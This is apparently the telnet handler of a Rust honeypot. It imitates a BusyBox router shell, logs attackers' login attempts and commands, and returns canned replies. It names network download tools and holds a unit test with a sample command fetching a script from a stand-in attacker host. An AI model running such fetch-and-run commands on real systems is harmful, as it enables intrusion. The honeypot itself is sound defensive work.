use crate::event::{Event, Kind};
use crate::net::{graceful_close, read_line, write_all_timeout, App};
use crate::util::{jitter_ms, strip_telnet_iac, truncate, MAX_FIELD};
use std::net::SocketAddr;
use tokio::net::TcpStream;

const HELLO: &[u8] = b"\r\nBusyBox v1.36.1 (2023-11-07 18:26:41 UTC) built-in shell (ash)\r\n\
      Enter 'help' for a list of built-in commands.\r\n\r\n";

pub async fn handle(mut sock: TcpStream, peer: SocketAddr, app: App, port: u16) {
    app.log
        .emit(Event::new("telnet", port, peer, Kind::Connect));
    jitter_ms(app.jitter_ms.0, app.jitter_ms.1).await;

    // Refuse every option; do not enable echo/linemode features.
    let _ = write_all_timeout(
        &mut sock,
        b"\xff\xfd\x03\xff\xfb\x01", // DO suppress-go-ahead, WILL echo
        app.read_timeout,
    )
    .await;
    let _ = write_all_timeout(&mut sock, HELLO, app.read_timeout).await;
    let _ = write_all_timeout(&mut sock, b"login: ", app.read_timeout).await;

    let mut stage: u8 = 0; // 0 user, 1 pass, 2 fake shell
    let mut username = String::new();
    let mut commands = 0usize;

    loop {
        if commands >= app.max_lines {
            break;
        }
        let buf = match read_line(&mut sock, 512, app.idle_timeout).await {
            Ok(b) if !b.is_empty() => b,
            _ => break,
        };
        let cleaned = strip_telnet_iac(&buf);
        let line = String::from_utf8_lossy(&cleaned);
        let input = line.trim_end_matches(['\r', '\n']).trim();

        match stage {
            0 => {
                if input.is_empty() {
                    let _ = write_all_timeout(&mut sock, b"login: ", app.read_timeout).await;
                    continue;
                }
                username = truncate(input, MAX_FIELD);
                let _ = write_all_timeout(&mut sock, b"Password: ", app.read_timeout).await;
                stage = 1;
            }
            1 => {
                app.log.emit(
                    Event::new("telnet", port, peer, Kind::Password)
                        .user(username.clone())
                        .pass(truncate(input, MAX_FIELD)),
                );
                let _ = write_all_timeout(&mut sock, b"\r\n# ", app.read_timeout).await;
                stage = 2;
            }
            _ => {
                if input.eq_ignore_ascii_case("exit")
                    || input.eq_ignore_ascii_case("logout")
                    || input.eq_ignore_ascii_case("quit")
                {
                    break;
                }
                if !input.is_empty() {
                    commands += 1;
                    app.log.emit(
                        Event::new("telnet", port, peer, Kind::Command)
                            .user(username.clone())
                            .data(truncate(input, MAX_FIELD)),
                    );
                    let reply = fake_shell_response(input);
                    let _ = write_all_timeout(&mut sock, reply.as_bytes(), app.read_timeout).await;
                }
                let _ = write_all_timeout(&mut sock, b"# ", app.read_timeout).await;
            }
        }
    }

    app.log
        .emit(Event::new("telnet", port, peer, Kind::Disconnect));
    graceful_close(sock).await;
}

/// Canned replies only. wget/curl never fetch. No host commands.
pub fn fake_shell_response(cmd: &str) -> String {
    let cmd_lower = cmd.to_ascii_lowercase();
    let base = cmd_lower.split_whitespace().next().unwrap_or("");
    match base {
        "ls" => "bin  dev  etc  home  proc  tmp  usr  var\r\n".into(),
        "pwd" => "/root\r\n".into(),
        "whoami" => "root\r\n".into(),
        "id" => "uid=0(root) gid=0(root)\r\n".into(),
        "cat" => "cat: permission denied\r\n".into(),
        "uname" => {
            "Linux router 2.6.36 #1 SMP PREEMPT Fri Mar 14 11:26:04 CST 2014 mips unknown\r\n"
                .into()
        }
        "ifconfig" | "ip" => {
            "eth0      Link encap:Ethernet  HWaddr 00:1A:2B:3C:4D:5E\r\n          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0\r\n".into()
        }
        "ps" => "  PID USER       VSZ STAT COMMAND\r\n    1 root      1236 S    /sbin/init\r\n  142 root      2056 S    httpd\r\n  199 root      1872 S    telnetd\r\n".into(),
        "help" => "Built-in commands:\r\nls pwd whoami id uname ifconfig ps cat\r\n".into(),
        "wget" | "curl" | "tftp" | "nc" | "busybox" => {
            "Download failed: connection refused\r\n".into()
        }
        _ => format!("{base}: not found\r\n"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wget_does_not_look_successful() {
        let r = fake_shell_response("wget http://evil.example/a.sh");
        assert!(r.contains("refused"));
    }
}
